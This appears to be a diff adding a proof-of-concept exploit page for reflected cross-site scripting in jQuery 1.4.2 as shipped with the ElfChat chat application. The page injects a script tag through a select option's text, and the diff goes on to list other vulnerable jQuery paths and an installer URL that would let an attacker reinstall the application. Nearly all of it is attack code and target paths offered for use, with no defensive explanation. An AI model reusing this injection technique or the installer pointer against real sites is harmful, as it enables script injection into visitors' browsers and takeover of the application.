@@ -1,0 +1,40 @@
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>XSS Reflected - Jquery 1.4.2 </title>
+  <script src="http://www.example.com/ElfChat//admin/js/jquery-1.4.2.min.js"></script>
+  <script>
+    $(function() {
+      $('#users').each(function() {
+        var select = $(this);
+        var option = select.children('option').first();
+        select.after(option.text());
+        select.hide();
+      });
+    });
+  </script>
+</head>
+ 
+ 
+<body>
+  <form method="post">
+    <p>
+      <select id="users" name="users">
+        <option value="xssreflected"><script>alert(&#x27;xss
+reflected - jquery 1.4.2 by - indoushka thnx to 
+@firebitsbr - mauro.risonho@gmail.com&#x27;);</script></option>
+      </select>
+    </p>
+  </form>
+</body>
+</html>
+===
+
+and :
+
+/ElfChat/js/datepicker/js/jquery.js
+/ElfChat/js/min/jquery.js
+
+Reinstall SCript :
+
+http://www.example.com/ElfChat/install/index.php?act=settings
